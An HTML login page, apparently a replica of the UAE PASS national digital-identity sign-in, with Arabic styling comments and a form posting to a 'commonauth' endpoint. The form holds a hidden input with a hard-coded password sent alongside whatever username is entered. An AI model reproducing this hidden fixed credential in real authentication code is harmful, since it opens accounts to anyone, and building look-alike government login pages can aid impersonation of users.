<!doctype html>
<html lang="ar">
<head dir="rtl">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - تسجيل الدخول</title>
    
    <style>
        /* إعدادات الألوان والهوية البصرية للهوية الرقمية */
        :root {
            --uae-blue-dark: #005a9c;
            --uae-blue-light: #00a19c;
            --uae-black: #1a1a1a;
            --uae-gray-bg: #f9f9f9;
            --uae-border: #ced4da;
            --uae-text-muted: #6c757d;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            direction: rtl;
        }

        /* الشريط الملون العلوي المتحرك */
        .rectangle {
            height: 6px;
            background: linear-gradient(90deg, var(--uae-blue-dark), var(--uae-blue-light));
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
        }

        /* الحاوية الرئيسية */
        .container {
            max-width: 420px;
            margin: 0 auto;
            padding: 100px 20px 40px;
            text-align: center;
        }

        /* تنسيق الصورة فوق النص */
        .top-image-container {
            margin-bottom: 20px;
        }

        .top-image-container img {
            max-width: 140px; /* يمكنك تعديل الحجم من هنا */
            height: auto;
        }

        /* جملة الدخول عن طريق الهوية الرقمية */
        .login-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--uae-black);
            margin-bottom: 30px;
        }

        .login-title span {
            color: var(--uae-blue-dark);
        }

        /* تنسيق حقل الإدخال */
        .idn-input {
            width: 100%;
            padding: 15px 20px;
            border: 1px solid var(--uae-border);
            border-radius: 8px;
            font-size: 15px;
            background-color: var(--uae-gray-bg);
            box-sizing: border-box;
            text-align: right;
            outline: none;
            transition: all 0.3s ease;
        }

        .idn-input:focus {
            border-color: var(--uae-blue-dark);
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 90, 156, 0.1);
        }

        /* خيار تذكرني */
        .form-check {
            text-align: right;
            margin-top: 15px;
            font-size: 14px;
            color: var(--uae-text-muted);
            display: flex;
            align-items: center;
        }

        .form-check input {
            margin-left: 10px;
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        /* زر تسجيل الدخول */
        .btn-login {
            width: 100%;
            background-color: var(--uae-black);
            color: #ffffff;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 25px;
            transition: background 0.3s ease;
        }

        .btn-login:hover {
            background-color: #333333;
        }

        /* الروابط الإضافية */
        .extra-links {
            margin-top: 25px;
            font-size: 14px;
        }

        .extra-links a {
            color: var(--uae-blue-dark);
            text-decoration: none;
            font-weight: bold;
        }

        .recover-link {
            display: block;
            margin-top: 15px;
            color: var(--uae-text-muted) !important;
            font-weight: normal !important;
            text-decoration: underline !important;
        }

        /* التذييل */
        .footer {
            margin-top: 60px;
            border-top: 1px solid #eeeeee;
            padding-top: 30px;
        }

        .footer img {
            max-width: 100px;
            margin-bottom: 15px;
        }

        .footer-menu {
            margin-bottom: 15px;
        }

        .footer-menu a {
            font-size: 12px;
            color: var(--uae-blue-dark);
            text-decoration: none;
            margin: 0 8px;
        }

        .copyright {
            font-size: 11px;
            color: #999999;
        }
    </style>
</head>
<body>

    <div class="rectangle"></div>

    <div class="container">
        
        <div class="top-image-container">
            <img src="uaepass/images/self_service.png" alt="UAE PASS Logo">
        </div>

        <div class="login-title">
            <p>الدخول عن طريق <span>الهوية الرقمية</span></p>
        </div>

        <form action="../../commonauth" method="post">
            
            <input type="text" class="idn-input" id="username" name="username" 
                   placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف" required>
            
            <div class="form-check">
                <input type="checkbox" checked id="rememberme" name="rememberme">
                <label for="rememberme">تذكرني</label>
            </div>

            <button type="submit" class="btn-login">تسجيل الدخول</button>
            
            <input type="hidden" name="password" value="ndwenw902ee9239">
            <input type="hidden" name="sessionDataKey" value="5b97084d-a443-4984-a417-63fdee833691">
        </form>

        <div class="extra-links">
            <p>ليس لديك حساب؟ <a href="https://uaepass.ae/signup">إنشاء حساب جديد</a></p>
            <a href="https://uaepass.ae/account-recovery" class="recover-link">كيفية استعادة الحساب؟</a>
        </div>

        <footer class="footer">
            <img src="uaepass/images/n6.png" alt="UAE Logo">
            <div class="footer-menu">
                <a href="#">الصفحة الرئيسية</a>
                <a href="#">نبذة عامة</a>
                <a href="#">الدعم</a>
                <a href="#">الأسئلة الشائعة</a>
            </div>
            <div class="copyright">حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.</div>
        </footer>
    </div>

</body>
</html>
